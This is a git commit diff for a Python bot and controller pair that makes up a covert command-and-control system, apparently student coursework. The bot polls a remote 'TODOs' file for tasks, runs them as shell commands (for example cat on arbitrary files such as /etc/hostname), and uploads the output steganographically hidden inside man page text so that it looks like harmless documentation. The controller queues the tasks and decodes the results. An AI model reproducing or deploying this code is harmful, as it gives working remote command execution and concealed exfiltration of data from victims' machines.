a49e47bbe9b89c87a5b5919dd099455fe61ae836
Miroslav Holeček <holecm16@fel.cvut.cz>
2023-01-08 16:18:30 +0100

    add task ids, man reading, result reporting (and reading in controller)

--- bot.py
+++ bot.py
@@ -1,19 +1,26 @@
+from gzip import open
+from platform import system
 from queue import Queue
+from re import split
 from subprocess import Popen, PIPE
+from time import time
 
-from constants import gid, gat
-from encoding import decode, decode_word, mvws
-from myhttp import get_file
+from encoding import decode, encode, mvws
+from myhttp import get_file, update_file
 
-def execute_shell(command):
+def execute_shell(command) -> bytes:
     p = Popen(command, stdout=PIPE, shell=True)
-    return p.communicate()
+    return p.communicate()[0]
+
+def timestamp() -> str:
+    return str(int(time()))
 
 class Bot:
     def __init__(self):
         # TODO - get name
         self.name = "Marin"
         self.todos = Queue()
+        self.platform = system().lower()
 
     def get_todos(self):
         raw = get_file("TODOs")
@@ -22,12 +29,14 @@ class Bot:
             if new[0] != '-':
                 # ignore task comments
                 continue
-            colon = new.index(':')
-            if new[2:colon] != self.name:
+            space = new.index(' ', 2)
+            colon = new.index(':', space)
+            if new[space+1:colon] != self.name:
                 # ignore others' tasks
                 continue
+            id = new[2:space]
             # preserve the first space
-            self.todos.put(new[colon+1:])
+            self.todos.put((id, new[colon+1:]))
         self.run_all_tasks()
 
     def run_all_tasks(self):
@@ -36,12 +45,12 @@ class Bot:
 
     def run_first_task(self):
         try:
-            task = self.todos.get()
+            (id, task) = self.todos.get()
             ot = decode(task).split(' ')
             operation = ot[0]
             args = '' if len(ot) < 2 else ' '.join(ot[1:])
         except:
-            self.report(task, "Failed to parse task")
+            self.report(id, task, b"Failed to parse task")
             return
         res = ""
         match operation:
@@ -50,15 +59,23 @@ class Bot:
             case 'dog':
                 res = execute_shell(f'cat {args}')
             case _:
-                res = "Unknown operation"
-        self.report(task, res)
+                res = b"Unknown operation"
+        self.report(id, task, res)
 
-    def report(self, task, result):
-        # TODO - encode, upload
-        print(f"Reporting for task '{task}'")
-        print(result)
-        print("==========")
-    
+    def report(self, id: str, task: str, result: bytes):
+        cmd = split(f'{mvws}| ', task)[2]
+        man_contents = self.read_man(cmd)
+        ct = encode(man_contents.decode('utf8'), result.decode('utf8'))
+        head = encode('Extracted using vorogoj v1', decode(task))
+        update_file(f'{cmd}-{id}', f'{head}\n\n### {cmd}\n\n{ct}')
+        
+    def read_man(self, cmd: str) -> bytes:
+        if self.platform == 'linux':
+            with open(f'/usr/share/man/man1/{cmd}.1.gz', 'rb') as f:
+                return f.read()
+        else:
+            # TODO: non-unixlike platform support
+            return execute_shell(f'man {cmd}')
 
 if __name__ == '__main__':
     b = Bot()
--- controller.py
+++ controller.py
@@ -4,7 +4,7 @@ from os.path import join
 from urllib.request import urlopen, Request
 
 from constants import gid, gat
-from encoding import encode
+from encoding import decode, encode
 from myhttp import get_file, update_file
 
 opmap = {
@@ -12,16 +12,24 @@ opmap = {
     'cat': 'dog'
 }
 
-def add_todo(name: str, task: str, operation: str, args: str = ""):
+def add_todo(name: str, id: str, task: str, operation: str, args: str = ""):
     old = get_file('TODOs')
     argstr = '' if len(args) == 0 else f' {args}'
-    new = f'{old}\n- {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
+    new = f'{old}\n- {id} {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
     if update_file('TODOs', new):
         print(f'Added operation "{operation}" for client "{name}"')
     else:
         print("Failed to add operation!")
-    
+
+def print_result(cmd: str, id: str):
+    res = get_file(f'{cmd}-{id}')
+    (head, title, ct) = res.split(f'\n\n')
+    print(decode(head))
+    print('---')
+    print(decode(ct))
+    print('---')
 
 if __name__ == '__main__':
-    add_todo('Marin', 'add bash manpage', 'cat', '/etc/hostname')
-    add_todo('Marin', 'add unzip manpage', 'w')
+    #add_todo('Marin', '123', 'add bash manpage', 'cat', '/etc/hostname')
+    #print_result('bash', '123')
+    pass
